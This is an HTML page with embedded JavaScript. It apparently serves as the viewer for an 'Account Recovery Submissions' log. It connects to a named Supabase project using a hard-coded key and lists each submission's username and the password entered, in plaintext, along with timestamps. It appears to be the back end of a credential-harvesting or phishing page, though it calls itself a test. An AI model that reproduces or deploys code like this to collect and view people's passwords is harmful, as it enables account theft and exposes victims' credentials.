<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  >

  <title>Test Logs</title>

  <style>

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 30px 18px;
      background: #f5f5f5;
      color: #111;
      font-family: Arial, Helvetica, sans-serif;
    }

    .container {
      width: 100%;
      max-width: 1100px;
      margin: auto;
    }

    .header {
      margin-bottom: 25px;
    }

    .badge {
      display: inline-block;
      padding: 5px 10px;
      margin-bottom: 10px;
      border-radius: 999px;
      background: #fffc00;
      font-size: 11px;
      font-weight: bold;
      letter-spacing: 1px;
    }

    h1 {
      margin: 0 0 8px;
      font-size: 30px;
    }

    .description {
      margin: 0;
      color: #666;
      font-size: 14px;
    }

    .panel {
      background: white;
      border-radius: 16px;
      overflow: hidden;
      box-shadow: 0 5px 20px rgba(0,0,0,.07);
    }

    .panel-header {
      padding: 18px 20px;
      border-bottom: 1px solid #eee;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    #count {
      color: #666;
      font-size: 13px;
    }

    button {
      border: none;
      border-radius: 8px;
      padding: 9px 14px;
      background: #111;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      opacity: .5;
    }

    .message {
      padding: 35px 20px;
      text-align: center;
      color: #666;
      font-size: 14px;
      line-height: 1.5;
    }

    .error {
      color: #c62828;
    }

    .table-wrapper {
      overflow-x: auto;
    }

    table {
      width: 100%;
      min-width: 750px;
      border-collapse: collapse;
    }

    th,
    td {
      padding: 14px 16px;
      border-bottom: 1px solid #eee;
      text-align: left;
      font-size: 13px;
      white-space: nowrap;
    }

    th {
      background: #fafafa;
      color: #555;
      font-size: 11px;
      text-transform: uppercase;
    }

    tr:last-child td {
      border-bottom: none;
    }

    .center {
      text-align: center;
    }

  </style>

</head>

<body>

<div class="container">

  <div class="header">

    <div class="badge">
      TEST LOGS
    </div>

    <h1>
      Account Recovery Submissions
    </h1>

    <p class="description">
      Test records stored in Supabase.
    </p>

  </div>


  <div class="panel">

    <div class="panel-header">

      <span id="count">
        Loading...
      </span>

      <button
        id="refreshButton"
        type="button"
      >
        Refresh
      </button>

    </div>


    <div id="content">

      <div class="message">
        Loading submissions...
      </div>

    </div>

  </div>

</div>


<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>

  const SUPABASE_URL =
    "https://eylwfjgrauziwzzsewaj.supabase.co";

  const SUPABASE_KEY =
    "sb_publishable_TTCNo4BgRANxkxaE5yqH9A_eDeAbVF8";

  const supabaseClient =
    window.supabase.createClient(
      SUPABASE_URL,
      SUPABASE_KEY
    );


  const content =
    document.getElementById("content");

  const count =
    document.getElementById("count");

  const refreshButton =
    document.getElementById("refreshButton");


  async function loadLogs() {

    refreshButton.disabled = true;

    count.textContent =
      "Loading...";

    content.innerHTML = `
      <div class="message">
        Loading submissions...
      </div>
    `;


    const { data, error } =
      await supabaseClient
        .from("test_submissions")
        .select(
          "id,username,password_entered,password_length,submitted_at"
        )
        .order(
          "submitted_at",
          {
            ascending: false
          }
        );


    if (error) {

      console.error(error);

      count.textContent =
        "Unable to load";

      content.innerHTML = `
        <div class="message error">
          Unable to load submissions.<br><br>
          ${escapeHtml(error.message)}
        </div>
      `;

      refreshButton.disabled = false;

      return;
    }


    count.textContent =
      data.length +
      (data.length === 1
        ? " submission"
        : " submissions");


    if (data.length === 0) {

      content.innerHTML = `
        <div class="message">
          No submissions yet.
        </div>
      `;

      refreshButton.disabled = false;

      return;
    }


    const rows =
      data.map(function(row) {

        const submitted =
          row.submitted_at
            ? new Date(
                row.submitted_at
              ).toLocaleString()
            : "";


        return `

          <tr>

            <td>
              ${escapeHtml(
                String(row.id)
              )}
            </td>

            <td>
              ${escapeHtml(
                row.username || ""
              )}
            </td>

            <td>
              ${escapeHtml(
                row.password_entered || ""
              )}
            </td>

            <td class="center">
              ${escapeHtml(
                String(
                  row.password_length ?? 0
                )
              )}
            </td>

            <td>
              ${escapeHtml(
                submitted
              )}
            </td>

          </tr>

        `;

      }).join("");


    content.innerHTML = `

      <div class="table-wrapper">

        <table>

          <thead>

            <tr>

              <th>ID</th>

              <th>Username</th>

              <th>Test Value</th>

              <th>Length</th>

              <th>Submitted</th>

            </tr>

          </thead>

          <tbody>

            ${rows}

          </tbody>

        </table>

      </div>

    `;


    refreshButton.disabled = false;

  }


  function escapeHtml(value) {

    return String(value)

      .replaceAll(
        "&",
        "&amp;"
      )

      .replaceAll(
        "<",
        "&lt;"
      )

      .replaceAll(
        ">",
        "&gt;"
      )

      .replaceAll(
        '"',
        "&quot;"
      )

      .replaceAll(
        "'",
        "&#039;"
      );

  }


  refreshButton.addEventListener(
    "click",
    loadLogs
  );


  loadLogs();

</script>

</body>
</html>
